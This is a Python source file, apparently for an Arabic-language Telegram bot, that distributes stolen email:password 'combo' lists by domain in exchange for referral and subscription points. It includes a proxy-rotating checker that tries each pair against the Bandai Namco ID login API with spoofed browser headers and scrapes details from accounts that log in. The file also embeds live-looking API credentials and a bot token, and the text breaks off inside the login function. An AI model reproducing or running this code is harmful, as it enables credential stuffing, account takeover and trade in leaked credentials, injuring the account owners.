import os
import io
import re
import sqlite3
import uuid
import asyncio
import math
import time
import random
import threading
import requests
import shutil
from datetime import datetime, date, timedelta
from collections import Counter, defaultdict
from pyrogram import Client, filters
from pyrogram.types import (
    Message, ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, ChatMemberUpdated
)
from pyrogram.errors import (
    FloodWait, UserIsBlocked, InputUserDeactivated,
    ChatAdminRequired, UserNotParticipant, ChannelPrivate, PeerIdInvalid
)
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== الإعدادات ====================
API_ID = int(os.getenv("API_ID", "20084899"))
API_HASH = os.getenv("API_HASH", "a860b181d2f15d0473ee309523a9fc19")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8839466034:AAF_ONFjOcoOSrcQtiTRrtWlTQJCDtR-Cxw")

OWNER_IDS = [int(x) for x in os.getenv("OWNER_IDS", "8604513259,7105884739").split(",") if x.strip()]
DB_PATH = os.getenv("DB_PATH", "combos.db")

WORK_DIR = os.path.dirname(os.path.abspath(__file__))
CHECKER_FILES_DIR = os.path.join(WORK_DIR, "checker_files")
CHECKER_PROXY_PATH = os.path.join(WORK_DIR, "checker_proxies.txt")

os.makedirs(CHECKER_FILES_DIR, exist_ok=True)

bot_enabled_for_users = True
ulp_feature_enabled = False

user_action_state = {}
user_filter_keywords = {}

subscription_cache = {}
SUB_CACHE_SECONDS = 90

FIRST_WITHDRAWAL_BONUS = 1.0
DAILY_REWARD_BASE = 0.5
ADVANCED_REFERRAL_REWARD = 0.5
BIG_WITHDRAWAL_THRESHOLD = 5000

PASSWORD_REPLACEMENTS = [
    "Aa123456",
    "Aa123456@",
    "Aa123123",
    "Aa12341234",
    "Aa11223344",
    "Aa@123456"
]

# متغيرات الفحص
checker_active = False
checker_lock = threading.Lock()
checker_proxy_list = []
checker_failed_proxies = set()
checker_results_lock = threading.Lock()
checker_stats = {
    'total': 0,
    'checked': 0,
    'valid': 0,
    'invalid': 0,
    'start_time': None,
    'last_update': None
}
counter_message_id = None

# إنشاء العميل
app = Client(
    "combo_bot_session",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    in_memory=True
)

# ==================== قاعدة البيانات ====================
def init_db():
    dirname = os.path.dirname(DB_PATH)
    if dirname:
        os.makedirs(dirname, exist_ok=True)

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    cursor.execute('PRAGMA journal_mode = WAL;')
    cursor.execute('PRAGMA synchronous = NORMAL;')
    cursor.execute('PRAGMA cache_size = -64000;')
    cursor.execute('PRAGMA temp_store = MEMORY;')
    cursor.execute('PRAGMA foreign_keys = ON;')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS combos (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            combo TEXT NOT NULL
        )
    ''')
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_combo ON combos(combo)')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            points REAL DEFAULT 0,
            referred_by INTEGER DEFAULT NULL,
            is_blocked INTEGER DEFAULT 0,
            ban_reason TEXT DEFAULT NULL,
            first_withdrawal_done INTEGER DEFAULT 0,
            referral_rewarded INTEGER DEFAULT 0,
            total_withdrawals INTEGER DEFAULT 0,
            last_daily_claim TEXT DEFAULT NULL,
            streak_count INTEGER DEFAULT 0,
            level TEXT DEFAULT 'عادي',
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    new_columns = [
        ("ban_reason", "TEXT DEFAULT NULL"),
        ("first_withdrawal_done", "INTEGER DEFAULT 0"),
        ("referral_rewarded", "INTEGER DEFAULT 0"),
        ("total_withdrawals", "INTEGER DEFAULT 0"),
        ("last_daily_claim", "TEXT DEFAULT NULL"),
        ("streak_count", "INTEGER DEFAULT 0"),
        ("level", "TEXT DEFAULT 'عادي'"),
        ("created_at", "TEXT DEFAULT CURRENT_TIMESTAMP"),
    ]
    for col, definition in new_columns:
        try:
            cursor.execute(f"ALTER TABLE users ADD COLUMN {col} {definition}")
        except Exception:
            pass

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS withdrawals (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            domain TEXT NOT NULL,
            amount INTEGER NOT NULL,
            points_spent REAL DEFAULT 0,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_withdrawals_user ON withdrawals(user_id)')
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_withdrawals_date ON withdrawals(created_at)')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS channels (
            channel_id TEXT PRIMARY KEY,
            title TEXT DEFAULT 'قناة',
            invite_link TEXT DEFAULT NULL
        )
    ''')
    try:
        cursor.execute("ALTER TABLE channels ADD COLUMN title TEXT DEFAULT 'قناة'")
    except Exception:
        pass
    try:
        cursor.execute("ALTER TABLE channels ADD COLUMN invite_link TEXT DEFAULT NULL")
    except Exception:
        pass

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS ad_channels (
            channel_id TEXT PRIMARY KEY,
            points_reward REAL DEFAULT 1
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS ad_rewards (
            user_id INTEGER,
            channel_id TEXT,
            PRIMARY KEY (user_id, channel_id)
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS gifts (
            code TEXT PRIMARY KEY,
            points REAL NOT NULL,
            used_by INTEGER DEFAULT NULL
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS search_stats (
            domain TEXT PRIMARY KEY,
            search_count INTEGER DEFAULT 0
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS waitlist (
            user_id INTEGER NOT NULL,
            domain TEXT NOT NULL,
            notified INTEGER DEFAULT 0,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP,
            PRIMARY KEY (user_id, domain)
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS bot_settings (
            key TEXT PRIMARY KEY,
            value TEXT NOT NULL
        )
    ''')
    defaults = [
        ("total_operations", "0"),
        ("referral_points", "1.0"),
        ("advanced_referral_points", "0.5"),
        ("log_channel", ""),
        ("forced_sub_enabled", "1"),
        ("daily_reward", "0.5"),
        ("big_withdrawal_alert", "1"),
    ]
    for k, v in defaults:
        cursor.execute('INSERT OR IGNORE INTO bot_settings (key, value) VALUES (?, ?)', (k, v))

    cursor.execute('''
        INSERT OR IGNORE INTO channels (channel_id, title, invite_link)
        VALUES (?, ?, ?)
    ''', ("-1003434964850", "قناة البوت الرسمية", "https://t.me/+91X31VNWIU1iNDM8"))

    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect(DB_PATH, timeout=30)
    conn.execute('PRAGMA journal_mode = WAL;')
    conn.execute('PRAGMA synchronous = NORMAL;')
    conn.row_factory = sqlite3.Row
    return conn

def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS

# ==================== دوال النقاط والإعدادات ====================
def ensure_user(user_id: int):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    if not cursor.fetchone():
        cursor.execute(
            "INSERT INTO users (user_id, points, is_blocked) VALUES (?, 0, 0)",
            (user_id,)
        )
        conn.commit()
    conn.close()

def get_user_points(user_id: int) -> float:
    ensure_user(user_id)
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT points FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return float(row["points"]) if row else 0.0

def add_user_points(user_id: int, points: float):
    ensure_user(user_id)
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        "UPDATE users SET points = points + ? WHERE user_id = ?",
        (points, user_id)
    )
    conn.commit()
    conn.close()
    update_user_level(user_id)

def deduct_user_points(user_id: int, points: float):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        "UPDATE users SET points = MAX(0, points - ?) WHERE user_id = ?",
        (points, user_id)
    )
    conn.commit()
    conn.close()

def get_user_row(user_id: int):
    ensure_user(user_id)
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return row

def update_user_block_status(user_id: int, status: int, reason: str = None):
    conn = get_db()
    cursor = conn.cursor()
    if reason is not None:
        cursor.execute(
            "UPDATE users SET is_blocked = ?, ban_reason = ? WHERE user_id = ?",
            (status, reason, user_id)
        )
    else:
        cursor.execute(
            "UPDATE users SET is_blocked = ? WHERE user_id = ?",
            (status, user_id)
        )
    conn.commit()
    conn.close()

def is_user_banned(user_id: int) -> tuple:
    row = get_user_row(user_id)
    if row and row["is_blocked"] == 1:
        return True, row["ban_reason"] or "محظور من قبل الإدارة"
    return False, None

def increment_operations():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        "UPDATE bot_settings SET value = CAST(value AS INTEGER) + 1 WHERE key = 'total_operations'"
    )
    conn.commit()
    conn.close()

def get_total_operations() -> int:
    return int(get_setting("total_operations", "0"))

def get_setting(key: str, default: str = "") -> str:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT value FROM bot_settings WHERE key = ?", (key,))
    row = cursor.fetchone()
    conn.close()
    return row["value"] if row else default

def set_setting(key: str, value: str):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT OR REPLACE INTO bot_settings (key, value) VALUES (?, ?)",
        (key, value)
    )
    conn.commit()
    conn.close()

def get_referral_points() -> float:
    return float(get_setting("referral_points", "1.0"))

def get_advanced_referral_points() -> float:
    return float(get_setting("advanced_referral_points", "0.5"))

def set_referral_points(points: float):
    set_setting("referral_points", str(points))

def get_log_channel() -> str:
    return get_setting("log_channel", "")

def set_log_channel(channel_id: str):
    set_setting("log_channel", channel_id)

def log_search_domain(domain: str):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO search_stats (domain, search_count) VALUES (?, 1) "
        "ON CONFLICT(domain) DO UPDATE SET search_count = search_count + 1",
        (domain.lower(),)
    )
    conn.commit()
    conn.close()

# ==================== المستويات ====================
def calculate_level(points: float, total_withdrawals: int) -> str:
    if points >= 100 or total_withdrawals >= 50:
        return "ذهبي"
    if points >= 30 or total_withdrawals >= 15:
        return "فضي"
    return "عادي"

def update_user_level(user_id: int):
    row = get_user_row(user_id)
    if not row:
        return
    new_level = calculate_level(float(row["points"]), int(row["total_withdrawals"] or 0))
    if new_level != row["level"]:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET level = ? WHERE user_id = ?", (new_level, user_id))
        conn.commit()
        conn.close()

def get_level_emoji(level: str) -> str:
    return {"ذهبي": "🥇", "فضي": "🥈", "عادي": "🥉"}.get(level, "🥉")

# ==================== سجل السحوبات ====================
def record_withdrawal(user_id: int, domain: str, amount: int, points_spent: float):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO withdrawals (user_id, domain, amount, points_spent) VALUES (?, ?, ?, ?)",
        (user_id, domain, amount, points_spent)
    )
    cursor.execute(
        "UPDATE users SET total_withdrawals = total_withdrawals + 1 WHERE user_id = ?",
        (user_id,)
    )
    conn.commit()
    conn.close()
    update_user_level(user_id)

def get_user_withdrawals_count(user_id: int) -> int:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) as c FROM withdrawals WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return int(row["c"]) if row else 0

def get_last_operations(user_id: int, limit: int = 5) -> list:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        "SELECT domain, amount, points_spent, created_at FROM withdrawals "
        "WHERE user_id = ? ORDER BY id DESC LIMIT ?",
        (user_id, limit)
    )
    rows = cursor.fetchall()
    conn.close()
    return rows

# ==================== المكافأة اليومية ====================
def claim_daily_reward(user_id: int) -> tuple:
    row = get_user_row(user_id)
    today = date.today().isoformat()
    last = row["last_daily_claim"]
    streak = int(row["streak_count"] or 0)

    if last == today:
        return False, "⚠️ لقد استلمت مكافأتك اليومية بالفعل اليوم.", 0.0

    yesterday = (date.today() - timedelta(days=1)).isoformat()
    if last == yesterday:
        streak += 1
    else:
        streak = 1

    reward = float(get_setting("daily_reward", str(DAILY_REWARD_BASE)))
    if streak >= 7:
        reward += 0.25
    if streak >= 14:
        reward += 0.25

    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        "UPDATE users SET last_daily_claim = ?, streak_count = ? WHERE user_id = ?",
        (today, streak, user_id)
    )
    conn.commit()
    conn.close()

    add_user_points(user_id, reward)
    return True, f"✅ استلمت <b>{reward}</b> نقطة!\n🔥 سلسلتك الحالية: <b>{streak}</b> يوم متتالي.", reward

# ==================== قائمة الانتظار ====================
def add_to_waitlist(user_id: int, domain: str):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT OR IGNORE INTO waitlist (user_id, domain) VALUES (?, ?)",
        (user_id, domain.lower())
    )
    conn.commit()
    conn.close()

# ==================== نظام الاشتراك الإجباري ====================
def get_forced_channels():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT channel_id, title, invite_link FROM channels")
    rows = cursor.fetchall()
    conn.close()
    return [{"id": r["channel_id"], "title": r["title"] or "قناة", "link": r["invite_link"]} for r in rows]

def is_forced_sub_enabled() -> bool:
    return get_setting("forced_sub_enabled", "1") == "1"

def clear_sub_cache(user_id: int = None):
    if user_id is None:
        subscription_cache.clear()
    else:
        subscription_cache.pop(user_id, None)

async def is_user_in_channel(client: Client, user_id: int, channel_id: str) -> bool:
    try:
        chat_id = int(channel_id) if (str(channel_id).startswith("-") or str(channel_id).isdigit()) else channel_id
        try:
            member = await client.get_chat_member(chat_id, user_id)
        except FloodWait as e:
            await asyncio.sleep(min(e.value, 8))
            member = await client.get_chat_member(chat_id, user_id)

        status = str(member.status).lower()
        if any(s in status for s in (
            "creator", "owner", "administrator", "member",
            "chatmemberstatus.member", "chatmemberstatus.administrator",
            "chatmemberstatus.creator", "chatmemberstatus.owner"
        )):
            return True
        if "restricted" in status:
            return bool(getattr(member, "is_member", False))
        return False
    except (UserNotParticipant, ChannelPrivate, ChatAdminRequired, PeerIdInvalid, FloodWait):
        return False
    except Exception:
        return False

async def check_subscription(client: Client, user_id: int, force_refresh: bool = False) -> tuple:
    if is_owner(user_id):
        return True, []
    if not is_forced_sub_enabled():
        return True, []

    if not force_refresh and user_id in subscription_cache:
        if time.time() - subscription_cache[user_id] < SUB_CACHE_SECONDS:
            return True, []

    channels = get_forced_channels()
    if not channels:
        return True, []

    missing = []
    for ch in channels:
        ok = await is_user_in_channel(client, user_id, ch["id"])
        if not ok:
            missing.append(ch)

    if not missing:
        subscription_cache[user_id] = time.time()
        return True, []
    else:
        subscription_cache.pop(user_id, None)
        return False, missing

def build_subscription_keyboard(missing_channels: list) -> InlineKeyboardMarkup:
    buttons = []
    for ch in missing_channels:
        link = ch.get("link")
        if not link:
            cid = ch["id"]
            if str(cid).startswith("@"):
                link = f"https://t.me/{cid[1:]}"
            elif str(cid).startswith("-100"):
                link = f"https://t.me/c/{cid[4:]}"
            else:
                link = f"https://t.me/{cid}"
        buttons.append([InlineKeyboardButton(text=f"📢 {ch['title']}", url=link)])

    buttons.append([InlineKeyboardButton(text="✅ تحقق من الاشتراك", callback_data="check_force_sub")])
    return InlineKeyboardMarkup(buttons)

async def send_force_sub_message(client: Client, chat_id: int, missing: list, edit_message: Message = None):
    text = (
        "⛔️ <b>يجب عليك الاشتراك في القنوات التالية أولاً لاستخدام البوت:</b>\n\n"
        "اشترك في <b>جميع</b> القنوات ثم اضغط على زر «✅ تحقق من الاشتراك»"
    )
    kb = build_subscription_keyboard(missing)
    if edit_message:
        try:
            await edit_message.edit_text(text, reply_markup=kb)
            return
        except Exception:
            pass
    await client.send_message(chat_id, text, reply_markup=kb)

# ==================== Audit Log ====================
async def send_audit_log(client: Client, user, domain: str, amount: int, points: float):
    log_ch = get_log_channel()
    if not log_ch:
        return
    try:
        user_id = user.id
        first_name = user.first_name or "مستخدم"
        username = f"@{user.username}" if user.username else "بدون يوزر"

        log_text = (
            f"📥 <b>عملية سحب جديدة (Audit Log)</b>\n\n"
            f"👤 <b>المستخدم:</b> {first_name}\n"
            f"🆔 <b>الآيدي:</b> <code>{user_id}</code>\n"
            f"🌐 <b>اليوزر:</b> {username}\n"
            f"🎯 <b>الدومين:</b> <code>{domain}</code>\n"
            f"📊 <b>العدد:</b> <b>{amount:,}</b> حساب\n"
            f"💳 <b>النقاط:</b> <b>{points}</b>"
        )
        chat_id = int(log_ch) if (log_ch.startswith("-") or log_ch.isdigit()) else log_ch
        await client.send_message(chat_id, log_text)
    except Exception as e:
        print(f"[AUDIT LOG ERROR] {e}")

async def notify_big_withdrawal(client: Client, user, domain: str, amount: int):
    if amount < BIG_WITHDRAWAL_THRESHOLD:
        return
    if get_setting("big_withdrawal_alert", "1") != "1":
        return

    text = (
        f"🚨 <b>سحب كبير!</b>\n\n"
        f"👤 {user.first_name or 'مستخدم'} (<code>{user.id}</code>)\n"
        f"🎯 الدومين: <code>{domain}</code>\n"
        f"📊 الكمية: <b>{amount:,}</b> حساب"
    )
    for oid in OWNER_IDS:
        try:
            await client.send_message(oid, text)
        except Exception:
            pass

# ==================== إعلانات النقاط ====================
@app.on_chat_member_updated()
async def on_ad_member_update(client: Client, update: ChatMemberUpdated):
    user_id = update.from_user.id if update.from_user else None
    if not user_id:
        return

    chat_identifier = str(update.chat.id)
    chat_username = f"@{update.chat.username}" if update.chat.username else None

    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        "SELECT channel_id, points_reward FROM ad_channels WHERE channel_id = ? OR channel_id = ?",
        (chat_identifier, chat_username)
    )
    row = cursor.fetchone()

    if row:
        target_ch, reward_pts = row["channel_id"], float(row["points_reward"])
        old_status = str(update.old_chat_member.status).lower() if update.old_chat_member else ""
        new_status = str(update.new_chat_member.status).lower() if update.new_chat_member else ""

        joined = (not update.old_chat_member or "left" in old_status or "kicked" in old_status) and \
                 ("member" in new_status or "administrator" in new_status)
        left = update.old_chat_member and ("member" in old_status or "administrator" in old_status) and \
               ("left" in new_status or "kicked" in new_status)

        if joined:
            cursor.execute(
                "SELECT 1 FROM ad_rewards WHERE user_id = ? AND channel_id = ?",
                (user_id, target_ch)
            )
            if not cursor.fetchone():
                add_user_points(user_id, reward_pts)
                cursor.execute(
                    "INSERT INTO ad_rewards (user_id, channel_id) VALUES (?, ?)",
                    (user_id, target_ch)
                )
                conn.commit()
                try:
                    await client.send_message(
                        user_id,
                        f"🎉 تم إضافة <b>{reward_pts}</b> نقطة لاشتراكك في القناة الإعلانية!"
                    )
                except Exception:
                    pass
        elif left:
            cursor.execute(
                "SELECT 1 FROM ad_rewards WHERE user_id = ? AND channel_id = ?",
                (user_id, target_ch)
            )
            if cursor.fetchone():
                deduct_user_points(user_id, reward_pts)
                cursor.execute(
                    "DELETE FROM ad_rewards WHERE user_id = ? AND channel_id = ?",
                    (user_id, target_ch)
                )
                conn.commit()
                try:
                    await client.send_message(
                        user_id,
                        f"⚠️ تم خصم <b>{reward_pts}</b> نقطة لمغادرتك القناة الإعلانية."
                    )
                except Exception:
                    pass
    conn.close()

# ==================== دوال معالجة الكومبو ====================
def count_available_combos(domain: str) -> int:
    conn = get_db()
    cursor = conn.cursor()
    query = f"%{domain.lower()}%"
    cursor.execute("SELECT COUNT(*) as c FROM combos WHERE LOWER(combo) LIKE ?", (query,))
    count = cursor.fetchone()["c"]
    conn.close()
    return count

def extract_email_pass(line: str) -> str:
    line = line.strip()
    if not line:
        return line
    parts = line.split(':')
    if len(parts) >= 3:
        return f"{parts[-2]}:{parts[-1]}"
    if len(parts) == 2:
        return f"{parts[0]}:{parts[1]}"
    return line

async def fetch_and_delete_combos(domain: str, limit_count: int) -> list:
    def _db_op():
        conn = None
        try:
            conn = get_db()
            cursor = conn.cursor()
            query = f"%{domain.lower()}%"
            fetch_limit = int(limit_count * 2.5) + 1000
            cursor.execute(
                "SELECT id, combo FROM combos WHERE LOWER(combo) LIKE ? LIMIT ?",
                (query, fetch_limit)
            )
            rows = cursor.fetchall()
            if not rows:
                return []

            results = []
            ids_to_delete = []
            seen = set()

            for r in rows:
                if len(results) >= limit_count:
                    break
                cleaned = extract_email_pass(r["combo"])
                if cleaned and cleaned not in seen:
                    seen.add(cleaned)
                    results.append(cleaned)
                    ids_to_delete.append(r["id"])

            if ids_to_delete:
                placeholders = ",".join("?" * len(ids_to_delete))
                cursor.execute(
                    f"DELETE FROM combos WHERE id IN ({placeholders})",
                    ids_to_delete
                )
                conn.commit()
            return results
        except Exception as e:
            print(f"[DB ERROR] {e}")
            if conn:
                try:
                    conn.rollback()
                except Exception:
                    pass
            return []
        finally:
            if conn:
                conn.close()

    return await asyncio.to_thread(_db_op)

def add_combos_from_file(file_path: str) -> int:
    conn = get_db()
    cursor = conn.cursor()
    added = 0
    batch = []

    encodings_to_try = ['utf-8-sig', 'utf-8', 'latin-1', 'cp1252', 'utf-16']
    file_lines = []

    for enc in encodings_to_try:
        try:
            with open(file_path, "r", encoding=enc, errors="ignore") as f:
                file_lines = f.readlines()
            if file_lines:
                break
        except Exception:
            continue

    for line in file_lines:
        line_str = line.strip()
        if line_str and len(line_str) >= 3:
            batch.append((line_str,))
            if len(batch) >= 50000:
                cursor.executemany("INSERT INTO combos (combo) VALUES (?)", batch)
                conn.commit()
                added += len(batch)
                batch = []

    if batch:
        cursor.executemany("INSERT INTO combos (combo) VALUES (?)", batch)
        conn.commit()
        added += len(batch)

    conn.close()
    return added

def get_stats():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) as c FROM combos")
    total = cursor.fetchone()["c"]

    cursor.execute("SELECT COUNT(*) as c FROM users")
    total_users = cursor.fetchone()["c"]

    cursor.execute("SELECT COUNT(*) as c FROM users WHERE is_blocked = 1")
    blocked_users = cursor.fetchone()["c"]

    active_users = total_users - blocked_users

    cursor.execute("SELECT combo FROM combos LIMIT 40000")
    rows = cursor.fetchall()
    conn.close()

    domains = []
    domain_regex = re.compile(r'@([a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})', re.IGNORECASE)
    for r in rows:
        domains.extend([m.lower() for m in domain_regex.findall(r["combo"])])

    top = Counter(domains).most_common(15)
    return total, top, total_users, blocked_users, active_users

def delete_all_combos():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM combos")
    conn.commit()
    cursor.execute("VACUUM")
    conn.commit()
    conn.close()

def delete_by_domain(domain: str) -> int:
    conn = get_db()
    cursor = conn.cursor()
    query = "%" + domain.lower() + "%"
    cursor.execute("SELECT COUNT(*) as c FROM combos WHERE LOWER(combo) LIKE ?", (query,))
    count = cursor.fetchone()["c"]
    cursor.execute("DELETE FROM combos WHERE LOWER(combo) LIKE ?", (query,))
    conn.commit()
    cursor.execute("VACUUM")
    conn.commit()
    conn.close()
    return count

def get_top_points_users(limit: int = 20):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        "SELECT user_id, points, level FROM users WHERE points > 0 ORDER BY points DESC LIMIT ?",
        (limit,)
    )
    rows = cursor.fetchall()
    conn.close()
    return rows

def get_most_active_users(limit: int = 10):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        "SELECT user_id, total_withdrawals, points, level FROM users "
        "WHERE total_withdrawals > 0 ORDER BY total_withdrawals DESC LIMIT ?",
        (limit,)
    )
    rows = cursor.fetchall()
    conn.close()
    return rows

# ==================== دوال الفحص ====================
def normalize_proxy(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if '@' in proxy_str:
        if not proxy_str.startswith('http://') and not proxy_str.startswith('https://'):
            proxy_str = 'http://' + proxy_str
        return proxy_str
    if proxy_str.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return proxy_str
    if not proxy_str.startswith('http://') and not proxy_str.startswith('https://'):
        proxy_str = 'http://' + proxy_str
    temp = proxy_str.replace('http://', '').replace('https://', '')
    parts = temp.split(':')
    if len(parts) == 4:
        host, port, user, password = parts
        return f"http://{user}:{password}@{host}:{port}"
    elif len(parts) == 2:
        return proxy_str
    else:
        return proxy_str

def extract_user_info(html_content):
    user_data = {
        'username': None,
        'account_id': None,
        'player_rank': None,
        'email': None,
        'is_linked': False,
        'has_game_data': False
    }
    
    soup = BeautifulSoup(html_content, 'html.parser')
    
    username_elem = soup.find('p', {'class': 'top-contents-user-info'})
    if username_elem:
        user_data['username'] = username_elem.get_text(strip=True)
    
    account_id_elem = soup.find('dd', string=re.compile(r'[A-Z0-9]{10,}'))
    if account_id_elem:
        user_data['account_id'] = account_id_elem.get_text(strip=True)
    else:
        match = re.search(r'[A-Z0-9]{10,}', html_content)
        if match:
            user_data['account_id'] = match.group(0)
    
    player_rank = None
    
    rank_patterns = [
        r'Player Rank</dt>\s*<dd><a>(\d+)</a></dd>',
        r'"playerRank"\s*:\s*"?(\d+)"?',
        r'"rank"\s*:\s*"?(\d+)"?',
        r'<dd><a>(\d+)</a></dd>',
        r'<span[^>]*class="[^"]*rank[^"]*"[^>]*>(\d+)</span>',
        r'رتبة اللاعب[:]\s*(\d+)',
        r'レベル[:]\s*(\d+)',
    ]
    
    for pattern in rank_patterns:
        match = re.search(pattern, html_content, re.IGNORECASE)
        if match:
            player_rank = match.group(1).strip()
            if player_rank.isdigit() and int(player_rank) > 0 and int(player_rank) < 999:
                break
    
    if not player_rank:
        for dd in soup.find_all('dd'):
            text = dd.get_text(strip=True)
            if text.isdigit() and 1 <= int(text) <= 999:
                parent = dd.find_parent()
                if parent and 'user-info' in str(parent):
                    player_rank = text
                    break
    
    user_data['player_rank'] = player_rank
    
    email_match = re.search(r'<a>([^<]+@[^<]+)</a>', html_content)
    if email_match:
        user_data['email'] = email_match.group(1)
    else:
        email_match2 = re.search(r'"email"\s*:\s*"([^"]+@[^"]+)"', html_content)
        if email_match2:
            user_data['email'] = email_match2.group(1)
    
    if 'No game account was found linked' in html_content:
        user_data['is_linked'] = False
    elif 'إجراءات الربط' in html_content:
        user_data['is_linked'] = False
    else:
        user_data['is_linked'] = True
    
    has_game_data = False
    
    if user_data.get('is_linked'):
        username = user_data.get('username', '')
        if username and username.lower() not in ['not logged in', 'guest', '']:
            if user_data.get('player_rank') and user_data.get('player_rank').isdigit():
                if int(user_data.get('player_rank')) > 0:
                    has_game_data = True
        
        account_id = user_data.get('account_id', '')
        if account_id and account_id != '67829150454' and len(account_id) >= 10:
            has_game_data = True
    
    user_data['has_game_data'] = has_game_data
    
    return user_data

def perform_full_login(email, password, proxy=None):
    session = requests.Session()
    
    if proxy:
        try:
            session.proxies = {
                'http': proxy,
                'https': proxy
            }
        except Exception:
            pass
    
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        'upgrade-insecure-requests': "1",
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    
    try:
        main_url = "https://ww.bandainamcoentwebstore.com/opbr-ww/en"
        main_response = session.get(main_url, headers=headers, timeout=15)
        
        if main_response.status_code != 200:
            return None
        
        login_url = "https://account-api.bandainamcoid.com/v3/login/idpw"
        
        payload = {
            'client_id': "FXpKtpYzmcZIH0d5R2AX2KwJmO8btruHY8yoZe2f",
            'redirect_uri': "https://ww.bandainamcoentwebstore.com/opbr-ww/en/callback",
            'backto': "",
            'customize_id': "",
            'login_id': email,
            'password': password,
            'retention': "1",
            'language': "ar",
            'cookie': '{"language":"ar","retention_tmp":"1","mnwlogindata":"6320b99de33868d68ad4f258f4ae387a6ce098e889a344b79af2e49deefd02c8decff42f4ed7ace385ee11bc0da5503f78a2e527f776285f68e312c07ac06e41","retention":"1","OptanonAlertBoxClosed":"2026-07-06T06:42:54.377Z","passkeyInfoProd":"220d7837-6359-4f5d-b7a5-a42b5ddbdda6","OptanonConsent":"isGpcEnabled=0&datestamp=Thu+Jul+09+2026+00:50:23+GMT+0300+(التوقيت+العربي+الرسمي)&version=202505.2.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=39170fc3-a8f6-47d3-9a08-5ea6da26a2dd&interactionCount=2&isAnonUser=1&landingPath=NotLandingPage&groups=C0004:0,C0003:0,C0002:0,C0001:1&AwaitingReconsent=false&intType=2&geolocation=IQ;BG","challengeProd":"36680055-3800-4e55-9c28-3949bfd6b4b7"}',
            'prompt': ""
        }
        
        login_headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/javascript, */*; q=0.01",
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile': '?1',
            'origin': "https://account.bandainamcoid.com",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://account.bandainamcoid.com/",
            'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
            'priority': "u=1, i"
